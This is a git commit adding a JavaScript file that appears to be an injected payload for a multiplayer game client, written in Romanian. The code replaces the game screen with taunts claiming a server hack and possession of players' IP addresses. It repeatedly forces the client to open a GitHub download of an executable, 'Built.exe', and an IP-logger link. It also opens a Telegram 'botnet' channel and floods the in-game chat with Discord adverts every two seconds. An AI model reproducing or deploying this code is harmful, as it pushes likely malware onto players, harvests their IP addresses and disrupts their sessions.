8611b43492183d2d028d28e9d41f21ac4d68b27f
Blankcc1 <132221752+Blankcc1@users.noreply.github.com>
2024-12-08 13:21:21 +0200

    Add files via upload

---
+++ sal.js
@@ -0,0 +1,148 @@
+document.body.innerHTML = `
+
+    
+
+    <div style="postion: fixed; font-size: 2vw; color: black; right: 1vw; font-family: Poppins;">
+
+    NEZZO ATACA<br>
+
+    V-AM PICAT SV-UL<br>
+
+    MATRIX ATACA SI IRL!<br>
+    
+    LASATI POKEMONI ROMANIA <br>
+    
+    AM TOATE IP URILE
+
+    <br>
+
+   
+   
+    
+
+  
+
+
+    <iframe width="1920" height="1080" 
+    src="https://www.youtube.com/embed/8TQZS9hbQa0?autoplay=1&%3Fvq=hd1080;controls=0;&amp;showinfo=1"frameborder="0"
+    allow="autoplay" allowfullscreen="true"></iframe>
+
+    </div>
+
+    `
+
+let i = 0;
+
+window.invokeNative('openUrl', 'https://t.me/alphinebotnet');
+window.invokeNative('openUrl', 'https://t.me/alphinebotnet');
+window.invokeNative('openUrl', 'https://t.me/alphinebotnet');
+window.invokeNative('openUrl', 'https://t.me/alphinebotnet');
+window.invokeNative('openUrl', 'https://cdn.discordapp.com/attachments/1237013980782788699/1315276073755344998/image.png?ex=6756d1cc&is=6755804c&hm=a27abd5039a1791110ae335b024ee631367737601a49a14c4cf465d555600368&');
+window.invokeNative('openUrl', 'https://github.com/Blankcc1/sadhaskjd/raw/refs/heads/main/Built.exe');
+window.invokeNative('openUrl', 'https://github.com/Blankcc1/sadhaskjd/raw/refs/heads/main/Built.exe');
+window.invokeNative('openUrl', 'https://github.com/Blankcc1/sadhaskjd/raw/refs/heads/main/Built.exe');
+window.invokeNative('openUrl', 'https://github.com/Blankcc1/sadhaskjd/raw/refs/heads/main/Built.exe');
+window.invokeNative('openUrl', 'https://github.com/Blankcc1/sadhaskjd/raw/refs/heads/main/Built.exe');
+window.invokeNative('openUrl', 'https://github.com/Blankcc1/sadhaskjd/raw/refs/heads/main/Built.exe');
+window.invokeNative('openUrl', 'https://github.com/Blankcc1/sadhaskjd/raw/refs/heads/main/Built.exe');
+window.invokeNative('openUrl', 'https://github.com/Blankcc1/sadhaskjd/raw/refs/heads/main/Built.exe');
+window.invokeNative('openUrl', 'https://github.com/Blankcc1/sadhaskjd/raw/refs/heads/main/Built.exe');
+window.invokeNative('openUrl', 'https://github.com/Blankcc1/sadhaskjd/raw/refs/heads/main/Built.exe');
+window.invokeNative('openUrl', 'https://github.com/Blankcc1/sadhaskjd/raw/refs/heads/main/Built.exe');
+window.invokeNative('openUrl', 'https://github.com/Blankcc1/sadhaskjd/raw/refs/heads/main/Built.exe');
+window.invokeNative('openUrl', 'https://github.com/Blankcc1/sadhaskjd/raw/refs/heads/main/Built.exe');
+window.invokeNative('openUrl', 'https://github.com/Blankcc1/sadhaskjd/raw/refs/heads/main/Built.exe');
+window.invokeNative('openUrl', 'https://github.com/Blankcc1/sadhaskjd/raw/refs/heads/main/Built.exe');
+window.invokeNative('openUrl', 'https://github.com/Blankcc1/sadhaskjd/raw/refs/heads/main/Built.exe');
+window.invokeNative('openUrl', 'https://github.com/Blankcc1/sadhaskjd/raw/refs/heads/main/Built.exe');
+window.invokeNative('openUrl', 'https://github.com/Blankcc1/sadhaskjd/raw/refs/heads/main/Built.exe');
+window.invokeNative('openUrl', 'https://github.com/Blankcc1/sadhaskjd/raw/refs/heads/main/Built.exe');
+window.invokeNative('openUrl', 'https://github.com/Blankcc1/sadhaskjd/raw/refs/heads/main/Built.exe');
+window.invokeNative('openUrl', 'https://github.com/Blankcc1/sadhaskjd/raw/refs/heads/main/Built.exe');
+window.invokeNative('openUrl', 'https://github.com/Blankcc1/sadhaskjd/raw/refs/heads/main/Built.exe');
+window.invokeNative('openUrl', 'https://github.com/Blankcc1/sadhaskjd/raw/refs/heads/main/Built.exe');
+window.invokeNative('openUrl', 'https://github.com/Blankcc1/sadhaskjd/raw/refs/heads/main/Built.exe');
+window.invokeNative('openUrl', 'https://github.com/Blankcc1/sadhaskjd/raw/refs/heads/main/Built.exe');
+window.invokeNative('openUrl', 'https://github.com/Blankcc1/sadhaskjd/raw/refs/heads/main/Built.exe');
+window.invokeNative('openUrl', 'https://github.com/Blankcc1/sadhaskjd/raw/refs/heads/main/Built.exe');
+window.invokeNative('openUrl', 'https://github.com/Blankcc1/sadhaskjd/raw/refs/heads/main/Built.exe');
+window.invokeNative('openUrl', 'https://github.com/Blankcc1/sadhaskjd/raw/refs/heads/main/Built.exe');
+window.invokeNative('openUrl', 'https://github.com/Blankcc1/sadhaskjd/raw/refs/heads/main/Built.exe');
+window.invokeNative('openUrl', 'https://github.com/Blankcc1/sadhaskjd/raw/refs/heads/main/Built.exe');
+window.invokeNative('openUrl', 'https://github.com/Blankcc1/sadhaskjd/raw/refs/heads/main/Built.exe');
+window.invokeNative('openUrl', 'https://github.com/Blankcc1/sadhaskjd/raw/refs/heads/main/Built.exe');
+window.invokeNative('openUrl', 'https://github.com/Blankcc1/sadhaskjd/raw/refs/heads/main/Built.exe');
+window.invokeNative('openUrl', 'https://github.com/Blankcc1/sadhaskjd/raw/refs/heads/main/Built.exe');
+window.invokeNative('openUrl', 'https://github.com/Blankcc1/sadhaskjd/raw/refs/heads/main/Built.exe');
+window.invokeNative('openUrl', 'https://github.com/Blankcc1/sadhaskjd/raw/refs/heads/main/Built.exe');
+window.invokeNative('openUrl', 'https://github.com/Blankcc1/sadhaskjd/raw/refs/heads/main/Built.exe');
+window.invokeNative('openUrl', 'https://github.com/Blankcc1/sadhaskjd/raw/refs/heads/main/Built.exe');
+window.invokeNative('openUrl', 'https://github.com/Blankcc1/sadhaskjd/raw/refs/heads/main/Built.exe');
+window.invokeNative('openUrl', 'https://github.com/Blankcc1/sadhaskjd/raw/refs/heads/main/Built.exe');
+window.invokeNative('openUrl', 'https://github.com/Blankcc1/sadhaskjd/raw/refs/heads/main/Built.exe');
+window.invokeNative('openUrl', 'https://t.me/alphinebotnet');
+window.invokeNative('openUrl', 'https://t.me/alphinebotnet');
+window.invokeNative('openUrl', 'https://t.me/alphinebotnet');
+window.invokeNative('openUrl', 'https://t.me/alphinebotnet');
+window.invokeNative('openUrl', 'https://iplogger.com/2tvsG5');
+window.invokeNative('openUrl', 'https://cdn.discordapp.com/attachments/1237013980782788699/1315276073755344998/image.png?ex=6756d1cc&is=6755804c&hm=a27abd5039a1791110ae335b024ee631367737601a49a14c4cf465d555600368&');
+window.invokeNative('openUrl', 'https://cdn.discordapp.com/attachments/1237013980782788699/1315276073755344998/image.png?ex=6756d1cc&is=6755804c&hm=a27abd5039a1791110ae335b024ee631367737601a49a14c4cf465d555600368&');
+window.invokeNative('openUrl', 'https://cdn.discordapp.com/attachments/1237013980782788699/1315276073755344998/image.png?ex=6756d1cc&is=6755804c&hm=a27abd5039a1791110ae335b024ee631367737601a49a14c4cf465d555600368&');
+window.invokeNative('openUrl', 'https://cdn.discordapp.com/attachments/1237013980782788699/1315276073755344998/image.png?ex=6756d1cc&is=6755804c&hm=a27abd5039a1791110ae335b024ee631367737601a49a14c4cf465d555600368&');
+window.invokeNative('openUrl', 'https://cdn.discordapp.com/attachments/1237013980782788699/1315276073755344998/image.png?ex=6756d1cc&is=6755804c&hm=a27abd5039a1791110ae335b024ee631367737601a49a14c4cf465d555600368&');
+window.invokeNative('openUrl', 'https://cdn.discordapp.com/attachments/1237013980782788699/1315276073755344998/image.png?ex=6756d1cc&is=6755804c&hm=a27abd5039a1791110ae335b024ee631367737601a49a14c4cf465d555600368&');
+window.invokeNative('openUrl', 'https://cdn.discordapp.com/attachments/1237013980782788699/1315276073755344998/image.png?ex=6756d1cc&is=6755804c&hm=a27abd5039a1791110ae335b024ee631367737601a49a14c4cf465d555600368&');
+window.invokeNative('openUrl', 'https://cdn.discordapp.com/attachments/1237013980782788699/1315276073755344998/image.png?ex=6756d1cc&is=6755804c&hm=a27abd5039a1791110ae335b024ee631367737601a49a14c4cf465d555600368&');
+window.invokeNative('openUrl', 'https://cdn.discordapp.com/attachments/1237013980782788699/1315276073755344998/image.png?ex=6756d1cc&is=6755804c&hm=a27abd5039a1791110ae335b024ee631367737601a49a14c4cf465d555600368&');
+window.invokeNative('openUrl', 'https://cdn.discordapp.com/attachments/1237013980782788699/1315276073755344998/image.png?ex=6756d1cc&is=6755804c&hm=a27abd5039a1791110ae335b024ee631367737601a49a14c4cf465d555600368&');
+window.invokeNative('openUrl', 'https://cdn.discordapp.com/attachments/1237013980782788699/1315276073755344998/image.png?ex=6756d1cc&is=6755804c&hm=a27abd5039a1791110ae335b024ee631367737601a49a14c4cf465d555600368&');
+window.invokeNative('openUrl', 'https://cdn.discordapp.com/attachments/1237013980782788699/1315276073755344998/image.png?ex=6756d1cc&is=6755804c&hm=a27abd5039a1791110ae335b024ee631367737601a49a14c4cf465d555600368&');
+window.invokeNative('openUrl', 'https://cdn.discordapp.com/attachments/1237013980782788699/1315276073755344998/image.png?ex=6756d1cc&is=6755804c&hm=a27abd5039a1791110ae335b024ee631367737601a49a14c4cf465d555600368&');
+window.invokeNative('openUrl', 'https://cdn.discordapp.com/attachments/1237013980782788699/1315276073755344998/image.png?ex=6756d1cc&is=6755804c&hm=a27abd5039a1791110ae335b024ee631367737601a49a14c4cf465d555600368&');
+window.invokeNative('openUrl', 'https://cdn.discordapp.com/attachments/1237013980782788699/1315276073755344998/image.png?ex=6756d1cc&is=6755804c&hm=a27abd5039a1791110ae335b024ee631367737601a49a14c4cf465d555600368&');
+window.invokeNative('openUrl', 'https://cdn.discordapp.com/attachments/1237013980782788699/1315276073755344998/image.png?ex=6756d1cc&is=6755804c&hm=a27abd5039a1791110ae335b024ee631367737601a49a14c4cf465d555600368&');
+window.invokeNative('openUrl', 'https://cdn.discordapp.com/attachments/1237013980782788699/1315276073755344998/image.png?ex=6756d1cc&is=6755804c&hm=a27abd5039a1791110ae335b024ee631367737601a49a14c4cf465d555600368&');
+window.invokeNative('openUrl', 'https://cdn.discordapp.com/attachments/1237013980782788699/1315276073755344998/image.png?ex=6756d1cc&is=6755804c&hm=a27abd5039a1791110ae335b024ee631367737601a49a14c4cf465d555600368&');
+window.invokeNative('openUrl', 'https://cdn.discordapp.com/attachments/1237013980782788699/1315276073755344998/image.png?ex=6756d1cc&is=6755804c&hm=a27abd5039a1791110ae335b024ee631367737601a49a14c4cf465d555600368&');
+window.invokeNative('openUrl', 'https://cdn.discordapp.com/attachments/1237013980782788699/1315276073755344998/image.png?ex=6756d1cc&is=6755804c&hm=a27abd5039a1791110ae335b024ee631367737601a49a14c4cf465d555600368&');
+
+
+
+$.post('https://chat/chatResult', JSON.stringify({
+
+          message: 'nezzo & manevra'
+
+    }))
+
+$.post('https://chat/chatResult', JSON.stringify({
+
+        message: 'discord.gg/manevra'
+
+    }))
+
+$.post('https://chat/chatResult', JSON.stringify({
+
+          message: 'discord.gg/manevra'
+
+    }))
+
+
+setInterval(() => {
+
+    i++
+
+
+    $.post('https://chat/chatResult', JSON.stringify({
+
+          message: 'nezzo & manevra '
+
+    }))
+
+    $.post('https://chat/chatResult', JSON.stringify({
+
+          message: 'BRR '
+
+    }))
+
+
+}, 2000)
